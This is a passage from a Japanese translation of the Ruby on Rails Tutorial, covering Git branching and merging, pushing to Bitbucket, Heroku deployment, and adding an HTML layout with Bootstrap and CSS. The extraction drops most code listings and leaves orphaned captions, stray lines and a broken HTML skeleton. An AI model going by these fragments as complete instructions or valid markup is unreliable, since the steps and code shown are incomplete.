[Create repository] をクリックしてリポジトリを作成したら、[Command line] > [I have an existing project] をクリックしてそこに表示される指示に従います (リスト\ref{code:bitbucket_add_push})。
リスト\ref{code:bitbucket_add_push}のように表示されない場合は、公開鍵が正しく追加されていない可能性がありますので、公開鍵の追加をやり直すことをおすすめします。
リポジトリをプッシュするときに「Are you sure you want to continue connecting (yes/no)?」と表示されたらyesと入力します。
Bitbucketに最初のアプリのリポジトリを作成する。
Bitbucketへのリポジトリ追加とリポジトリへのプッシュ。
リスト\ref{code:bitbucket_add_push}の最初のコマンドは、Bitbucketをリポジトリの\emph{origin}としてGitの設定ファイルに追加するためのものです。次のコマンドでは、ローカルのリポジトリをリモートのoriginにプッシュします
（\kode{-u}フラグについては気にする必要はありません。気になるのであれば "git set upstream"で検索してみてください）。
たとえば、著者が実行したコマンドは以下のとおりです。
Bitbucketのリポジトリページ。
\label{fig:bitbucket_repository_page}}<n>\end{figure}<n><n><n>    \subsection{ブランチ (branch)、変更 (edit)、 コミット (commit)、マージ (merge)}<n>    \label{sec:git_commands}<n><n>
\ref{sec:bitbucket}の手順に沿って進めた場合、\kode{README.rdoc}ファイルが自動的に認識されず、READMEがないというメッセージが表示されることに気付いたでしょう (図\ref{fig:bitbucket_no_readme})。
この表示は、\kode{rdoc}形式がBitbucketでは標準のREADMEとしてサポートされていないために起こります。実のところ、著者も含めほとんどの開発者は\emph{Markdown}形式を使用しています。
ここでは\kode{README.rdoc}ファイルの名前を\kode{README.md}に変更し、チュートリアル中にコンテンツを追加できるようにしておきましょう。
それと同時に、Gitでbranch、edit、commit、mergeを行う際にお勧めのワークフローの実例をご覧いただきます
Gitリポジトリをビジュアル表示するには、Atlassianの\href{http://www.sourcetreeapp.com/}{SourceTreeアプリケーション}が便利です。
Gitは、ブランチ (\emph{branch}) を極めて簡単かつ高速に作成することができます。ブランチは基本的にはリポジトリのコピーで、ブランチ上では元のファイルを触らずに新しいコードを書くなど、自由に変更や実験を試すことができます。
通常、親リポジトリは\emph{master}ブランチと呼ばれ、トピックブランチ (短期間だけ使う一時的なブランチ) は\kode{checkout}と\kode{-b}フラグを使って作成できます。
Switched to a new branch 'modify-README'
* modify-README
2つ目のコマンド (\kode{git branch}) は、すべてのローカルブランチを一覧表示します。「\kode{*}」はそのブランチが現在使用中であることを表します。
1番目の\kode{git checkout -b modify-README}コマンドで、ブランチの新規作成とそのブランチへの切り替えが同時に行われていることにご注目ください。\kode{modify-README}ブランチに「*」が付いていることで、このブランチが現在使用中であることが示されています
(\ref{sec:version_control}で\kode{co}エイリアスを設定した場合は、\kode{git co -b modify-README}と入力することもできます)。
詳細については\href{http://git-scm.com/book/en/git-branching}{\emph{Pro Git}のGitブランチ}に関する章を参照。
masterブランチはトピックブランチで行った変更に影響されないので、たとえブランチ上のコードが\emph{めちゃくちゃ}になってしまっても、masterブランチをチェックアウトしてトピックブランチを削除すれば、いつでも変更を破棄する事ができます。
具体的な方法についてはこの章の最後で説明します。
ちなみに、通常このような小さな変更のためにわざわざブランチを作成する必要はありませんが、「よい習慣を形成するには早すぎる」ということないので、早い時期から少しでも練習しておきましょう。
トピックブランチを作成後、READMEの内容をわかりやすく書き換えてみましょう。
著者の場合、デフォルトのRDocを編集するときには主に\href{http://daringfireball.net/projects/markdown/}{Markdown}というマークアップ言語を使用しています。拡張子を\kode{.md}にしておけば、GitHubにアップロードしたときに自動的にドキュメントがきれいに整形されます。
最初は、Gitに付属する\kode{mv}コマンド (注: Unixのmvコマンドではありません!) を使ってREADMEの拡張子を変更します。
続いて、リスト\ref{code:new_readme}の内容を\kode{README.md}に入力します。
新しい\kode{README}ファイル「\kode{README.md}」の内容。
# Ruby on Rails Tutorial: "hello, world!"
<n><n>This is the first application for the<n>[*Ruby on Rails Tutorial*](http://www.railstutorial.org/)<n>by [Michael Hartl](http://www.michaelhartl.com/).
変更が終わったら、ブランチの状態を確認してみましょう。
2 files changed, 5 insertions(+), 243 deletions(-)
delete mode 100644 README.rdoc
create mode 100644 README.md
\kode{-a}フラグは慎重に扱ってください。最後のコミット後に新しいファイルを追加した場合は、まず\kode{git add}を実行してバージョン管理下に置く必要があります。
コミットメッセージは\emph{現在形}かつ\href{http://en.wikipedia.org/wiki/Imperative_mood}{命令形}で書くようにしましょう (訳注: これは英語で書く場合のルールです。日本語であれば「〜を追加」などの体言止めがよいでしょう)。
Gitのモデルは、(単一のパッチではなく) 一連のパッチとしてコミットされます。そのため、コミットメッセージを書くときには、そのコミットが「何をしたのか」と過去形の履歴スタイルで書くよりも「何を\emph{する}」ためのものなのかを現在形かつ命令形で書く方が、後から見返したときにわかりやすくなります。
さらに、現在形かつ命令形で書いておけば、Gitコマンド自身によって生成されるコミットメッセージとも時制が整合します。
詳細についてはGitHubに投稿された\href{https://github.com/blog/926-shiny-new-commit-styles}{最新のコミット方法} (英語) を参照してください。
ファイルの変更が終わったので、マスターブランチにこの変更を\emph{マージ (merge)} します。
Switched to branch 'master'
Updating 34f06b7..2c92bef
Fast forward
README.rdoc     |  243 --------------------------------------------------
README.md       |    5 +
Gitの出力には\kode{34f06b7}のような文字列 (ハッシュ) が含まれていることがあります。Gitはこれらをリポジトリの内部処理に使用しています。
この文字列は環境の違いにより上記のものと少し異なるかもしれませんが、他の部分はほぼ同じはずです。
変更をマージした後は、\kode{git branch -d}を実行してトピックブランチを削除すれば終わりです。
Deleted branch modify-README (was 2c92bef).
トピックブランチの削除は必須ではありません。実際、トピックブランチを削除せずにそのままにしておくことはよく行われています。
トピックブランチを削除せずに残しておけば、トピックブランチとマスターブランチを交互に行き来して、きりの良い所で変更をマージする事ができます。
上で述べたように、\kode{git branch -D}でトピックブランチ上の変更を破棄することもできます。
# これはあくまで例です。ブランチでミスをした時以外は実行しないでください。
\kode{-d}フラグと異なり、\kode{-D}フラグは変更をマージしていなくてもブランチを削除してくれます。
\kode{README}ファイルの更新が終わったので、Bitbucketに変更をプッシュして結果を見てみましょう。
既に\ref{sec:bitbucket}で一度プッシュを行ったので、大抵のシステムでは\kode{git push}を実行するときに\kode{origin master}を省略できます。
Markdowndでフォーマットされた改良版\kode{README}ファイル
\label{fig:new_readme}}<n>\end{figure}<n><n>  % section version_control (end)<n><n>  \section{デプロイする} % (fold)<n>  \label{sec:deploying}<n><n>
この段階ではほとんど空っぽのRailsアプリケーションしかありませんが、本番環境にデプロイ (deploy: デプロイ) してしまいましょう。
アプリケーションのデプロイは必須ではありませんが、頻繁に本番環境にデプロイすることによって、開発サイクルでの問題を早い段階で見つけることができます。
開発環境のテストを繰り返すばかりで、いつまでも本番環境にデプロイしないままだと、アプリケーションを公開するぎりぎりの時になって思わぬ事態に遭遇する可能性が高まります
\emph{Railsチュートリアル}のサンプルアプリケーションでは気にする必要はありません。作りかけの恥ずかしいWebアプリケーションをネットにうっかり公開してしまわないだろうかと心配する方もいらっしゃるかと思いますが、それを防ぐための方法はいくつもありますのでご安心ください。\ref{sec:heroku_commands}はその方法の1つです。
かつてはRailsアプリの本番デプロイは大変な作業でしたが、ここ数年急速に簡単になってきており、さまざまな本番環境を選択できるようになりました。
“Engine X" と発音します。
私のお気に入りはHerokuで、Railsを含むRuby Webアプリ用のホスティングプラットフォームです
Herokuは、ソースコードのバージョン管理にGitを使用していれば、Railsアプリケーションを簡単に本番環境にデプロイできます
(Gitを導入したのは、まさにこのHerokuで使うためでもあります。まだGitをインストールしていない方は\ref{sec:version_control}を参照してください)。
さらに、Herokuのfree tier プランには、チュートリアルでの利用を含むさまざまな用途のための機能が十分過ぎるほど備わっています。
実際、本チュートリアルの最初の2つのエディションもHerokuに無料でホスティングしていたのです。Herokuに置いたチュートリアルは、数百万ものリクエストをこなしながら、1セントも支払う必要はありませんでした。
この章では、最初のアプリケーションをHerokuにデプロイします。
作業内容の一部に少しばかり高度な部分も含まれていますが、今はすべてを理解しておく必要はありませんのでご安心ください。今大事なのは、この章の終わりまで手順を進めることで、作成したアプリケーションを実際のWebサービスとしてデプロイすることです。
<n><n>    \subsection{Herokuのセットアップ}<n>    \label{sec:heroku_setup}<n><n>
Herokuでは\href{http://www.postgresql.org/}{PostgreSQL}データベースを使用します (ちなみに発音は “post-gres-cue-ell” で、よく“Postgres”と略されます)。そのためには、本番 (production) 環境に\texttt{pg} gemをインストールしてRailsがPostgreSQLと通信できるようにします
:\footnote{
一般的に、開発環境と本番環境は、データベースも含めてなるべく同じにしておく方が便利です。しかし本チュートリアルでは、教育的見地からあえてローカルではSQLite、本番ではPostgreSQLを使用するようにしています。
詳細については\ref{sec:sample_app_setup}を参照。
これはリスト\ref{code:gemfile_pg_gem}で使用されていました。
\kode{bundle install}に特殊なフラグ「--without production」を追加すると、本番用のgem (この場合は\texttt{pg}と\texttt{rails\_12factor}) はローカルの環境にはインストールされません。
以下を実行して変更をコミットできます。
次にHerokuのアカウントを新規作成して設定します。
最初に\href{http://api.heroku.com/signup}{Herokuでユーザー登録}します。
続いて、自分のシステムにHerokuコマンドラインクライアントがインストールされているかどうかを確認します。
クラウドIDEをお使いの場合は、Herokuのバージョン番号とともに\kode{heroku} CLIが利用可能であるというメッセージが表示されます。クラウドIDEを使用していない場合は、\href{https://toolbelt.heroku.com/}{Heroku Toolbelt}をインストールする必要があります
Herokuのコマンドラインインターフェイス (CLI) がインストールされていることが確認できたら、いよいよ\kode{heroku}コマンドでログインしてSSHキーを追加します。
最後に\kode{heroku create}コマンドを実行して、Herokuサーバーにサンプルアプリケーションの実行場所を作成します (リスト\ref{code:heroku_create})。
Herokuに新しいアプリケーションを作成する。
Git remote heroku added
この\kode{heroku}コマンドを実行すると、Railsアプリケーション専用のサブドメインが作成され、ただちにブラウザで表示可能になります。
今はまだ何もありませんが、すぐにデプロイしてWebページを表示させましょう。
<n><n>    \subsection{Herokuにデプロイする (1)}<n>    \label{sec:heroku_step_one}<n><n>
Railsアプリケーションを実際にHerokuにデプロイするには、まずGitを使用してHerokuにリポジトリをプッシュします。
$ git push heroku
(警告メッセージが若干表示されることがありますが、今は無視してください。
詳しくは\ref{sec:professional_grade_deployment}で解説します)。
失礼、その2はありません。
以上でおしまいです。
デプロイされたアプリケーションの表示は、\kode{heroku create} (リスト\ref{code:heroku_create}) を実行した際に生成されたアドレスをブラウザで開くだけです (もちろんここに表示されている著者のアドレスではなく、あなたのアドレスを使ってください)。
クラウドIDEではなくローカルコンピュータで作業している場合は、\kode{heroku open}コマンドでブラウザ表示することもできます。
実行結果を図\ref{fig:heroku_app}に示します。
ページの内容は図\ref{fig:hello_world_hello_app}とまったく同じですが、今やそれがインターネット上の本番Webページとして堂々と公開されているのです。
Heroku上で動いている最初のRailsチュートリアルアプリケーション。
\href{http://devcenter.heroku.com/heroku-command}{Herokuのコマンド}はたくさんあるので、ここでは簡単に触れる程度にとどめますが、少しだけ使ってみましょう。
アプリケーションの名前を変更してみます。
注意: この名前は、著者のサンプルアプリケーションで既に使用していますので、「必ず他の名前を使用してください」。
実際は、Herokuで生成されたデフォルトのアドレスでも十分です。
本当にアプリケーションの名前を変えてみたい場合は、次のようなランダムなサブドメイン名を設定し、この章の冒頭で説明したアプリケーションのセキュリティを実装してみる方法もあります。
hwpcbmze.herokuapp.com<n>seyjhflo.herokuapp.com<n>jhyicevg.herokuapp.com
このようなでたらめのサブドメイン名なら、URLを教えない限りサイトにアクセスされる心配もありません。
(ちなみに、Rubyの威力の一端をお見せするために、ランダムなサブドメイン名を生成するためのコンパクトなコードを以下に記します。
最高ですね。)
Herokuでは、サブドメインの他に独自ドメインも使用できます
(実を言うと、この\href{http://www.railstutorial.org}{Ruby on RailsチュートリアルWebサイト}もHeroku上に置かれています。本チュートリアルをオンラインで読んでいるのであれば、まさにHerokuにホスティングされたWebサイトを見ているということになります)。
See the \href{http://devcenter.heroku.com/}{Heroku documentation} for more information about custom domains and other Heroku topics.
この章ではインストール、開発環境の設定、バージョン管理、本番環境へのデプロイなど、多くの課題を達成しました。
次の章では、この第\ref{cha:beginning}章で学んだことを基礎として、データベースを備えた\emph{toyアプリ}を製作し、Railsでどんなことができるかをさらに詳しく学びます。
ここまでの進捗をTwitterに投稿したりFacebookで誰かに知らせたい場合は、以下のリンクをお使いください。
Ruby on Railsを学習中!
}.<n><n>\subsection{本章のまとめ} % (fold)<n>\label{sec:beginning_what_we_learned_in_this_chapter}<n><n>\begin{itemize}<n><n>\item 
Ruby on Railsとは、Web開発のためのフレームワークであり、Rubyプログラミング言語によって記述されている。
事前設定済みのクラウド環境を利用することで、Railsのインストール、アプリケーションの生成、生成されたファイルの編集を簡単に行うことができる。
コントローラのアクションを追加したり、ルートルーティングを変更したりするだけで「hello, world」アプリケーションを作成できる。
Gitによるバージョン管理を導入し、Bitbucketの非公開リポジトリにプッシュする理由は、データの喪失を防止し、他の開発者との共同作業を行えるようにするため。
作成したアプリケーションをHerokuの本番環境にデプロイした。
リスト\ref{code:hello_action}の\kode{hello}アクションを書き換え、「Hello, world!」の代わりに「hola, mundo!」と表示されるようにしてみましょう。
\emph{課外作業}: Railsの表示では「非\href{http://es.wikipedia.org/wiki/ASCII}{ASCII}文字」もサポートされています。スペイン語特有の逆さ感嘆符「¡」を含む「¡Hola, mundo!」を表示してみましょう (図\ref{fig:hola_mundo})
利用しているエディタによっては「invalid multibyte character」などのエラーメッセージが表示されることがあるかもしれませんが、気にすることはありません。
このメッセージを表示したくないのであれば、\href{http://lmgtfy.com/?q=invalid+multibyte+character}{エラーメッセージをググって}対応してください。
リスト\ref{code:hello_action}の\kode{hello}アクションを複製して、第2のアクション\kode{goodbye}を追加しましょう。このアクションは、「goodbye, world!」というテキストを表示します。
リスト\ref{code:hello_root_route}のルーティングを編集して、ルートルーティングの割り当て先を\kode{hello}アクションから\kode{goodbye}アクションに変更します (図\ref{fig:goodbye_world})。
ルートルーティングで「¡Hola, mundo!」を表示するよう変更する。
ルートルーティングで「goodbye, world!」を表示するよう変更する。
beginning
なお、演習とチュートリアル本編の食い違いを避ける方法については、演習用のトピックブランチに追加したメモ (\ref{sec:static_pages_exercises}) を参考にしてください。
\emph{注}: 『\emph{演習の解答マニュアル} (英語)』には\emph{Ruby on Railsチュートリアル}のすべての演習の解答が掲載されており、\href{http://www.railstutorial.org/}{www.railstutorial.org}で原著を購入いただいた方には無料で配布しています (訳注: 解答は英語です)。
\href{https://twitter.com/colmtuite}{Colm Tuite}の多大な貢献により、サンプルアプリケーションをBootstrap CSSのフレームワークに変換することができました。感謝します。
章の最後に、ユーザーをサイトにログインさせるための重要な一歩を踏み出します (\ref{sec:user_signup})。
この結果、本章ではテキストエディタによる修正とブラウザによる確認がほとんどになります。テスト駆動開発で進める唯一の箇所は、\ref{sec:contact_page}のContactページの追加する箇所のみです。
最後に、新しいテスト手法「 統合テスト (\emph{Integration Test})」について紹介します (\ref{sec:layout_link_tests})。統合テストを使って、最終的なレイアウトやリンクが正しいかどうかをチェックします。
<n><n>  \section{構造を追加する} % (fold)<n>  \label{sec:structure}<n><n>
\emph{Railsチュートリアル}はWeb開発のための本であり、Webデザインの本ではありませんが、だからといって\emph{何のスタイルもない}寒々しい外観のアプリケーションでいつまでも作業を続けていると憂鬱になってしまいます。そこで、この章ではレイアウトにいくつかの構造とCSSを与えて最小限のスタイルを追加します。カスタムCSSルールの他に、Twitter社によるオープンソースのWebデザインフレームワークである\href{http://getbootstrap.com/}{\emph{Bootstrap}}を利用します。
また、\emph{コード}そのものにもスタイルを与えます。つまり、散らかりはじめたコードレイアウトを\emph{パーシャル}を使用して整えるということです。
本書の残りでは、\emph{モックアップ} (Webの文脈ではよく \emph{ワイヤーフレーム}と呼ばれます) という、最終的なアプリケーションの外観を示す一種のラフスケッチを使用することにします
\emph{Ruby on Railsチュートリアル} のモックアップは、「\href{http://gomockingbird.com}{Mockingbird}」という素晴らしいモックアップ作成サービスで作られています。
この章では、 主に\ref{sec:static_pages}で紹介したサイトロゴ、ナビゲーションヘッダー、サイトフッターを含む静的ページを開発します。
これらのページの中で最も重要な、Homeページのモックアップを図\ref{fig:home_page_mockup}に示します。
モックアップに基いて作成した最終結果は図\ref{fig:site_with_footer}で確認することができます。
両者を見比べると、細部が若干異なることに気が付くでしょう (たとえば、実際には最後にRailsのロゴをページに追加します)。しかしモックアップは正確である必要はありませんので、これで十分です。
サンプルアプリケーションのHomeページのモックアップ
Gitでバージョン管理をしているのであれば、これまでと同様、この時点で新しいブランチを作成するのがよいでしょう。
この更新には、領域 (divタグ) の追加、CSSクラスの追加、サイトナビゲーションの起点となる領域の追加も含まれます。
完全なファイルをリスト\ref{code:layout_new_structure}に示します。続いて、これを構成している多くの部品について解説します。
表示結果を今すぐ確認したいのであれば、図\ref{fig:layout_no_logo_or_custom_css}で確認できます
(\emph{注:}この時点ではわざわざ見に行くほどの仕上がりではありませんが)。
構造を追加したWebサイトのレイアウト
DOCTYPE html>
<html>
<head>
<!--[if lt IE 9]>
    <![endif]
</head>
<body>
<nav>
</ul>
</nav>
</header>
</body>
</html>
それでは、リスト\ref{code:layout_new_structure}の新しい要素を上から順に見ていきましょう。
\emph{shim}と\emph{shiv}という単語は、今回の用途ではどちらでも大丈夫です。shimを意味は「洗う機械、もしくは薄い物質を整理しフィットさせるためのモノ、あるいは服を削除すること」なので、意味合いとしては前者が正しいです。ちなみに後者は「ナイフ、もしくは武器として使う剃刀」という意味なので、おそらく原著者である Sjoerd Visscherのちょっとしたイタズラ心でしょう。
上のコードには、以下のような奇妙な構文が含まれています。
これは、Microsoft Internet Explorer (IE) のバージョンが9より小さい場合 (\kode{if lt IE 9}) にのみ、囲まれている行を実行します。
この風変わりな文法\kode{ [if lt IE 9]} は、Railsの一部\emph{ではありません}。これは実は、\href{http://en.wikipedia.org/wiki/Conditional_comment}{条件付きコメント}と呼ばれるもので、今回のような状況のためにInternet Explorerで特別にサポートされています。
これにより、Firefox、Chrome、Safariなどの他のブラウザに影響を与えずに、IEのバージョンが9未満の場合に\emph{のみ}HTML5 shimをインクルードすることができるため、非常に好都合です。
それに続くセクションには、サイトのロゴを表示する\kode{header}、(\kode{div}タグによる) いくつかの領域、ナビゲーションリンクのリストがあります。
\kode{header}タグは、ページのトップに来るべき要素を表します。
CSSクラスは、Rubyのクラスとはまったく関係がありません。
すべてのHTML要素には、クラスと\emph{id}の両方を指定することができます。これらは単なるラベルで、CSSでスタイルを指定するときに便利です (\ref{sec:custom_css})。
クラスとIDの主な違いは、クラスはページの中で何度でも使用できるのに対し、IDは一度しか使用することができない点です。
今回の場合、すべてのnavbarクラスには、\ref{sec:custom_css}でインストールするBootstrapフレームワークによって特別な意味が与えられます。
\kode{header}タグの内側には2つの\kode{div}タグがあります。
\kode{div}タグは一般的な表示領域を表し、ドキュメントを別々のパーツに分ける以外のことはしません。
古いスタイルのHTMLでは、\kode{div}タグはサイトのほぼすべての領域に使用されますが、HTML5では多くのアプリケーションに共通の領域で使用する\kode{header}要素、\kode{nav}要素、\kode{section}要素が追加されています。
この場合、\kode{div}タグにもCSSクラス (\kode{container}) が与えられています。
\kode{header}タグのクラスと同様に、このクラスもBootstrapにおいて特別な意味を持っています。
divに続いて、埋め込みRubyコードが出現します。
第3引数はオプションハッシュで、この場合はサンプルアプリのリンクでCSSのid \kode{logo}を指定しています
(他の3つのリンクにはオプションハッシュが指定されていませんが、必須ではないので構いません)。
Railsヘルパーは、このようにオプションのハッシュを取ることがよくあり、これによりRailsのコードから離れることなく任意のHTMLオプションを柔軟に追加することができます。
divの内側の2番目の要素は、\emph{リストアイテム}タグ\kode{li}と\emph{順不同リスト}タグ\kode{ul}によって作られた、ナビゲーションリンクのリストです。
正確にはここでは不要なのですが、\kode{nav}タグには「その内側がナビゲーションリンクである」という意図を明示的に伝える役割があります。
さらに、\kode{ul}タグに付与されている\kode{nav}や\kode{navbar-nav}、\kode{navbar-right}クラスもBootstrapにおいて特別な意味を持ちます。したがって、\ref{sec:custom_css}でBootstrapのCSSを追加したときに、これらのスタイルも自動的に適用されます。
ブラウザからソースを見ることで確認ができますが、Railsが埋め込みRubyを評価し、レイアウトを描画すると、上のリストは以下のように置き換わります
スペースを入れると見栄えが変わるかもしれませんが、\ref{sec:testing_titles}で触れたようにHTMLは重複する空白を無視するのでどちらでも大丈夫です。
これがブラウザに返されるHTMLになります。
レイアウトの最後の部分は、メインコンテンツ用の\kode{div}です。
上と同様、\kode{container}クラスもBootstrapにおいて特別な意味を持ちます。
\ref{sec:layouts_and_embedded_ruby}で学んだように、\kode{yield}メソッドはWebサイトのレイアウトにページごとの内容を挿入します。
\ref{sec:partials}で追加するサイトフッターを除いて、これでレイアウトは完成しました。Homeページへアクセスして表示結果を確認することができます。
今後のスタイル要素を利用するために、
サインアップページへのリンクがあるHomeページ
    This is the home page for the
    sample application.
</h2>
第\ref{cha:sign_up}章でサイトにユーザーを追加するときに備えて、最初の\kode{link\_to}に仮のリンクを作成します。
上で挙げた\kode{div}タグのCSSクラス\kode{jumbotron}や、signupボタンの\kode{btn}クラス、\kode{btn-lg}クラス、\kode{btn-primary}クラスはすべて、Bootstrapにおいて特別な意味を持ちます。
2番目の\kode{link\_to}では、引数として画像ファイルのパスと任意のオプションハッシュをとる\kode{image\_tag}ヘルパーの能力が示されています。シンボルを使用して、この場合は\kode{alt}属性を設定しています。
Cloud IDEやUnix系のOS (Max OS Xなど) を使っている場合は、次のように\kode{curl}コマンドで簡単に取得できます
もしOS Xの\href{http://brew.sh/}{Homebrew}が使えるようになっていれば、\kode{brew install curl}というコマンドを打って\kode{curl}をインストールすることができます。
Cloud IDEを使っていると、(筆者にも理由は分からないのですが) ときどき2行目のmvコマンドで失敗することがあるようです。その場合は、1行目の\kode{curl}コマンドをもう一度実行して、ロゴ画像が正しくダウンロードできているかどうか確認してください
(\kode{curl}コマンドの詳細については、\href{http://conqueringthecommandline.com/book/curl}{\emph{Conquering the Command Line}という本の第3章} (英語) を参照してください) 。
リスト\ref{code:signup_button}で \kode{image\_tag}ヘルパーを使っているので、Railsは該当する画像ファイルを、アセットパイプラインを通して\kode{app/assets/images/}ディレクトリの中から探してくれます (アセットパイプラインについては\ref{sec:sass_and_the_asset_pipeline}で説明します)。
\kode{image\_tag}の効果を確かめるために、ブラウザから生成されたHTMLを見てみましょう
この書式に従うタグは\emph{閉じタグ}として知られています。
ファイル名が重ならないようにするために、Railsが\kode{9308b8f92fea4c19a3a0d8385b494526}という文字列 (実際の文字列はシステムごとに異なります) を追加していることがわかります。これは、たとえば画像ファイルを新しい画像に更新したときに、ブラウザ内に保存されたキャッシュに意図的にヒットさせないようにするための仕組みです。
また、\kode{src}属性には "\kode{images}" というディレクトリ名が\emph{含まれていない}ことにも注目してください。これは\kode{assets}ディレクトリ内の他のディレクトリ (imagesやjavascripts、stylesheetsなど) も同様です。
最後に、\kode{alt}属性は、画像がない場合に代わりに表示される文字列です。たとえば視覚障害のあるユーザーが使用するスクリーンリーダーでは、ここの属性が読み上げられて、そこに画像があることが示されます。
HTML標準では実際に要求されているにも関わらず、画像に\kode{alt}属性を付けていない手抜きのWebサイトをときどき見かけます。
なお、今回は (先頭が大文字の) "Rails"とするために\kode{alt}テキストを明示的に設定しています。
いよいよ、ここまでの苦労の成果を確認する準備ができました (図\ref{fig:layout_no_logo_or_custom_css})。
思っていたよりもみすぼらしいでしょうか。
そうかもしれません。
しかし、HTML要素に実用的なクラスを与えるという良い仕事ができたのも確かです。さらに、クラスを与えたこの段階で、CSSを使用してサイトにスタイルを与えることができたのは、タイミングとして非常に適切であると思います。
\ref{sec:adding_to_the_layout}では、多くのHTML要素にCSSクラスを関連付けました。こうしておくことで、CSSベースでレイアウトを構成する際に高い柔軟性を与えてくれます。
\ref{sec:adding_to_the_layout}で述べたように、これらのクラスの多くは、Twitterが作成したフレームワークである\href{http://getbootstrap.com/}{Bootstrap}特有のものです。Bootstrapを使用すると、洗練されたWebデザインとユーザーインターフェイス要素を簡単にHTML5アプリケーションに追加することができます。
この節では、サンプルアプリケーションにスタイルを追加するために、カスタムCSSルールとBootstrapを組み合わせて使用します。
注目すべき点は、Bootstrapを使うことでアプリケーションを\href{http://en.wikipedia.org/wiki/Responsive_web_design}{\emph{レシポンシブデザイン}}にできるということです。これにより、どの端末でアプリケーションを閲覧しても、ある程度見栄えをよくすることができます。
最初に、リスト\ref{code:bootstrap_sass}で示しているようにBootstrapを追加しましょう。これは、\texttt{bootstrap-sass} gemを使用してRailsアプリケーションに導入できます。
Bootstrapフレームワークでは、動的なスタイルシートを生成するために\href{http://lesscss.org/}{LESS CSS}言語を使用していますが、RailsのAsset Pipelineはデフォルトでは (LESSと非常によく似た) Sass言語をサポートします (\ref{sec:sass_and_the_asset_pipeline})。そのため、\texttt{bootstrap-sass}は、LESSをSassへ変換し、必要なBootstrapファイルを現在のアプリケーションですべて利用できるようにします
Asset PipelineではLessを使うこともできます。詳しくは\href{http://rubygems.org/gems/less-rails-bootstrap}{\texttt{less-rails-bootstrap} gem}を参照してください。
いつものように\kode{bundle install}を実行して、Bootstrapをインストールします。
ちなみに、\kode{rails generate}コマンドを実行することでコントローラーごとに分けられたCSSファイルが自動的に生成されますが、これらのファイルを正しい順序で読み込ませるのは至難の技なので、本チュートリアルでは (簡潔のために) すべてのCSSを1つにまとめる方針を採っています。
カスタムCSSを動かすための最初の一歩は、カスタムCSSファイルを作ることです。
app/assets/stylesheets/custom.css.scss
(ここでは\ref{sec:green} の途中で紹介した \kode{touch} コマンドを使っていますが、ファイルが作成できるなら [新規ファイル作成] や他のコマンドでも問題ありません。)
このディレクトリ名とファイル名は、どちらも重要です。
以下のディレクトリは、
app/assets/stylesheets/
Asset Pipeline (\ref{sec:sass_and_the_asset_pipeline})の一部であり、このディレクトリに置かれたスタイルシートは\kode{application.css}の一部として自動的にWebサイトのレイアウトにインクルードされます。
さらに、ファイル名の\kode{custom.css.scss}には\kode{.css}という拡張子も含まれているので、このファイルはCSSファイルであることが示されています。また、\kode{.scss}という拡張子も含まれているので、 このファイルはSassを記述できるCSSファイル (Sassy CSS: Scss) であることも示されており、Asset Pipelineはこれを見てSassを処理できるようにします
(Sassは\ref{sec:sass}まで登場しませんが、\texttt{bootstrap-sass} gemが動作するためのおまじないとして必要です)。
カスタムCSS用のファイルを作成したら、リスト\ref{code:bootstrap_css}のように \kode{@import}を使用して、Bootstrap (とそれに関連するSprockets) をインクルードします
もしこのステップが摩訶不思議に思えたら、次のように考えてみましょう。「私はただ\href{https://github.com/twbs/bootstrap-sass#bootstrap-for-sass---}{bootstrap-sassのREADMEファイル}に従っているのだ」と。
Bootstrap CSSを追加する
リスト\ref{code:bootstrap_css}の2行では、Bootstrap CSSのフレームワークを導入しています。
導入後、Webサーバを再起動させると、アプリケーションに反映させることができます (\ref{fig:sample_app_only_bootstrap}で紹介したように、Ctrl-Cを押してWebサーバを停止させた後、 \kode{rails server}コマンドを打ってWebサーバを起動してください)。うまくいけば図\ref{fig:sample_app_only_bootstrap}のような結果に
さて、テキストの配置は今ひとつで、ロゴにはスタイルもありませんが、色使いとsignupボタンはなかなかよい感じになってきました。
次に、リスト\ref{code:universal_css}に示したように、Webサイト全体にわたってレイアウトと個別のページにスタイルを与えるためのCSSを追加します。
テストの結果を図\ref{fig:sample_app_universal}に示します。
すべてのページに適用される共通のスタイルをCSSに追加する
/* universal */
スペースや共通スタイルを追加した結果
リスト\ref{code:universal_css}のCSSの形式は一貫しています。
CSSルールでは一般に、クラス、id、HTMLタグ、またはそれらの組み合わせ、のいずれかを指定します。そしてその後ろにスタイリングコマンドのリストを記述します。
たとえば、以下のコードでは、
ページ上部に60ピクセルの余白を追加します。
\kode{header}タグに\kode{navbar-fixed-top}クラスが与えられているので、これに従ってBootstrapはナビゲーションバーをページ上部に固定し、ナビゲーションバーの下に余白を置いて主要部分から分離します
(デフォルトのnavbarの色がBootstrap 2.0から変更されたため、現在の淡色の代わりにダークな色調にしたい場合は\kode{navbar-inverse}クラスを使用する必要があります)。
また、このルールにある以下のCSSは、
\kode{center}クラスに\kode{text-align: center}プロパティを関連付けています。
言い換えると、\kode{.center}冒頭のドット\kode{.}は、このルールがクラスに対してスタイルを適用することを示しています。
この場合、\kode{center}クラスに属している (\kode{div}などの) タグの内側にある要素は、すべてページ中でセンタリングされることを意味しています
(このクラスの例はリスト\ref{code:signup_button}で参照できます)。
Bootstrapには洗練されたタイポグラフィーを利用できるCSSルールがありますが、ここではさらに、リスト\ref{code:typography_css}に示したようにサイトのテキストの外観を変えるカスタムCSSルールを追加しましょう。
(これらのルールはHomeページですべて適用されるとは限りませんが、サンプルアプリケーションの他の場所でも使用されるものもあります)。
リスト\ref{code:typography_css}を反映した結果を図\ref{fig:sample_app_typography}で確認することができます。
洗練されたタイポグラフィーを利用するためのCSSを追加する
/* typography */
タイポグラフィースタイルを追加する
最後に、いくつかのルールをサイトロゴに追加します。このサイトロゴは「sample app」だけが表示されているシンプルなものです。
リスト\ref{code:logo_css}のCSSは、テキストを大文字に変換し、サイズ、色、配置を変更します
(サイトロゴがページで一度しか使用されないことを前提としてCSS idを使用していますが、代わりにクラスを使用することもできます)。
サイトロゴにCSSを追加する
/* header */
HTMLの色は、16進数 (基数が16) の3つの数値の組み合わせで表現され、赤、緑、青の三原色に (この順序で) コード化することができます。
以下のコードは、
リスト\ref{code:logo_css}のCSSの結果は図\ref{fig:sample_app_logo}で確認できます。
デザインされたロゴとサンプルアプリ
リスト\ref{code:layout_new_structure}のレイアウトはその目的を果たしていますが、少々散らかっています。
HTML shimは、それだけで3行も占有し、風変わりなIE特有の文法を使用しているので、これをうまく隠すことができたらどんなによいでしょう。
また、HTMLヘッダーは論理的な単位を形成するため、一箇所にまとめる必要もあります。
Railsでは、\emph{パーシャル (partial)} と呼ばれる機能を使用してこれを実現することができます。
